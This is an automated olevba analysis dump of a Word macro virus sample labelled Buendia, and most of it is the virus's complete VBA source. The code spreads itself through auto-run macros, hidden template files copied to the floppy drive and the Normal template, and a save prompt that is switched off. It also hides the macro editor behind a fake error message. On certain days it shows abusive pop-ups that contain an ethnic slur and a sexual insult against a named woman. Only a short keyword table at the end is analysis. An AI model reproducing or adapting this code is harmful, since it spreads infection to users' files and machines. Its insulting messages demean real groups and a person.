olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Buendia-756a4b35796837c6149c8fcdd0337db77347744b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Buendia-756a4b35796837c6149c8fcdd0337db77347744b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo21.bas 
in file: Virus.MSWord.Buendia-756a4b35796837c6149c8fcdd0337db77347744b - OLE stream: 'Macros/VBA/Módulo21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'
'

Sub AutoOpen()
On Error GoTo seguir
   FileCopy "a:\~wd11.tmp", Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd07.tmp"
   SetAttr Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd07.tmp", vbSystem + vbHidden
   FileCopy "a:\~wd11.tmp", Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp"
   SetAttr Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp", vbSystem + vbHidden
   Options.SaveNormalPrompt = False
   Copiar_Macros
seguir:

On Error GoTo continua
ActiveDocument.AttachedTemplate = "~wd07.tmp"

continua:

Application.ShowVisualBasicEditor = False

End Sub
Sub Copiar_Macros()
On Error Resume Next
    Application.OrganizerCopy Source:="A:\~wd07.tmp", Destination:= _
        NormalTemplate.FullName, Name:= _
        "Módulo21", object:=wdOrganizerObjectProjectItems
Exit Sub
End Sub
Sub ArchivoNuevo()
On Error Resume Next
Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd07.tmp", _
        newtemplate:=False
End Sub
Sub ArchivoNuevoPredeter()
On Error Resume Next
    Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd07.tmp", _
        newtemplate:=False
End Sub
Sub AutoNew()
On Error Resume Next
If Documents.Count = 0 Then
    Documents.Add Template:= _
        Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd07.tmp", _
        newtemplate:=False
End If
End Sub
Sub AutoExec()
On Error Resume Next
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp", "a:\~wd11.tmp"
If Err.Number <> 0 Then GoTo seguir
   SetAttr "a:\~wd11.tmp", vbSystem + vbHidden
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp", "a:\~wd07.tmp"
   SetAttr "a:\~wd07.tmp", vbSystem + vbHidden

seguir:
If Day(Date) = 1 Or Day(Date) = 3 Or Day(Date) = 5 Or Day(Date) = 7 Or Day(Date) = 9 Or Day(Date) = 11 Or Day(Date) = 13 Or Day(Date) = 15 Or Day(Date) = 17 Or Day(Date) = 19 Or Day(Date) = 21 Or Day(Date) = 23 Or Day(Date) = 25 Or Day(Date) = 27 Or Day(Date) = 29 Or Day(Date) = 30 Then
    MsgBox ("En costa, sierra y selva, EL CHINO ES UNA MIERDA!!! ")
    Application.OnTime When:=Now + TimeValue("00:01:00"), Name:="Mensaje"

End If

If Application.Documents.Count = 0 Then
    Documents.Add Template:= _
        "C:\Archivos de programa\Microsoft Office\Plantillas\~wd07.tmp", _
        newtemplate:=False
End If

End Sub

Sub AutoExit()
On Error Resume Next
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp", "a:\~wd11.tmp"
If Err.Number <> 0 Then GoTo fin
   SetAttr "a:\~wd11.tmp", vbSystem + vbHidden
   FileCopy Application.Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\~wd11.tmp", "a:\~wd07.tmp"
   SetAttr "a:\~wd07.tmp", vbSystem + vbHidden
fin:
End Sub
Sub ViewVBcode()
    a = MsgBox("No pudo encontrar o iniciar Microsoft Visual Basic.", vbExclamation)
End Sub

Sub HerramMacro()
    a = MsgBox("No Macros, no dictadura! FUERA FUJIMORI Y MONTACHINOS!!", vbExclamation)
End Sub
Sub mensaje()
    a = MsgBox("Laura es una puta, el chino es su caficho!", vbExclamation)
End Sub
Sub FileOpen()
On Error Resume Next
    AutoExit
    Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileSaveAs()
On Error Resume Next
    AutoExit
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
On Error Resume Next
    AutoExit
    Application.ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

